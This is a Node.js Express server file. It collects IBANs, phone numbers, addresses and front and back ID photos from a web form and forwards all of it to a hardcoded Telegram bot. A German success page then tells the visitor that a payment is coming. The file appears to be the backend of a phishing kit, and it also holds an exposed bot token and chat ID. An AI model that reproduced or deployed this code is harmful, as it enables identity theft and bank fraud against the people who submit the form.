const express = require('express');
const axios = require('axios');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const FormData = require('form-data');

// Set up storage for uploaded files using multer
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, 'uploads/'); // Save uploads in "uploads" folder
    },
    filename: (req, file, cb) => {
        cb(null, Date.now() + path.extname(file.originalname)); // Use a timestamp for the file name
    }
});

const upload = multer({ storage: storage });

// Set up Express server
const app = express();

// Use the dynamic port assigned by the hosting platform or default to 3000 for local development
const port = process.env.PORT || 3000;

// Use express to parse incoming JSON and URL encoded data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files like your HTML and CSS
app.use(express.static('public'));

// Handle form submission
app.post('/submit', upload.fields([{ name: 'front-id' }, { name: 'back-id' }]), async (req, res) => {
    const { 'iban-number': iban, phone, address } = req.body;
    const frontId = req.files['front-id'] ? req.files['front-id'][0] : null;
    const backId = req.files['back-id'] ? req.files['back-id'][0] : null;

    const botToken = '7519001225:AAH9vvsnL4_Qz0FL3qk0p98lAMCvHsgjcE0';  // Replace with your bot's API token
    const chatId = '7009891691';          // Replace with your chat ID

    const message = `Maiden Name: ${iban}\nPhone: ${phone}\nAddress: ${address}`;

    try {
        // Send text message to Telegram
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message
        });

        // Function to send images to Telegram
        const sendImageToTelegram = async (imagePath) => {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', fs.createReadStream(imagePath)); // Attach the image

            await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, formData, {
                headers: formData.getHeaders(),
            });
        };

        // Send front ID image if available
        if (frontId) {
            const frontImagePath = path.join(__dirname, 'uploads', frontId.filename);
            await sendImageToTelegram(frontImagePath);
        }

        // Send back ID image if available
        if (backId) {
            const backImagePath = path.join(__dirname, 'uploads', backId.filename);
            await sendImageToTelegram(backImagePath);
        }

        // Redirect to a success page, regardless of Telegram response
        res.redirect('/success');
    } catch (error) {
        // Ignore the error and simply redirect to failure page
        console.error('Error sending message to Telegram, but ignoring:', error.response ? error.response.data : error.message);
        res.redirect('/failure');  // Redirect to a failure page
    }
});

// Success page route
app.get('/success', (req, res) => {
    res.send(`
        <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Übermittlung erfolgreich</title>
    <link rel="icon" href="icon.png">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        /* General reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* Body Styles */
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #f4f7fc;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        /* Success Container Styles */
        .success-container {
            background-color: #ffffff;
            border-radius: 8px;
            padding: 30px;
            max-width: 600px;
            width: 100%;
            text-align: center;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }

        /* Heading Styles */
        .success-container h1 {
            font-size: 2.5rem;
            font-weight: 500;
            color: #003d7a;
            margin-bottom: 20px;
        }

        /* Paragraph Styles */
        .success-container p {
            font-size: 1.1rem;
            line-height: 1.6;
            color: #555;
            margin-bottom: 30px;
        }

        /* Link Styles */
        .success-container a {
            display: inline-block;
            font-size: 1.1rem;
            color: #ffffff;
            background-color: #003d7a;
            padding: 12px 25px;
            border-radius: 4px;
            text-decoration: none;
            transition: background-color 0.3s ease;
        }

        .success-container a:hover {
            background-color: #003d7a;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .success-container {
                padding: 20px;
            }
            .success-container h1 {
                font-size: 2rem;
            }
            .success-container p {
                font-size: 1rem;
            }
            .success-container a {
                font-size: 1rem;
                padding: 10px 20px;
            }
        }

        @media (max-width: 480px) {
            .success-container h1 {
                font-size: 1.8rem;
            }
            .success-container p {
                font-size: 0.95rem;
            }
            .success-container a {
                font-size: 1rem;
                padding: 8px 15px;
            }
        }
    </style>
</head>
<body>
    <div class="success-container">
        <h1>Formular erfolgreich übermittelt!</h1>
        <p>Vielen Dank für das Absenden Ihres Formulars.
            Wir freuen uns, Ihnen mitteilen zu können, dass
            es erfolgreich empfangen wurde
            und derzeit bearbeitet wird.
            Sobald die Bearbeitung abgeschlossen ist,
            werden wir mit der Übermittlung Ihrer
            Zahlung fortfahren und Sie werden entsprechend benachrichtigt. Wir danken Ihnen
            für Ihre Geduld und Mitarbeit.</p>
        <a href="index.html">Zurück zur Startseite</a>
    </div>
</body>
</html>
    `);
});

// Failure page route (if Telegram fails to send message)
app.get('/failure', (req, res) => {
    res.send('<h1>There was an issue submitting the form. Please try again.</h1>');
});

// Start the Express server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
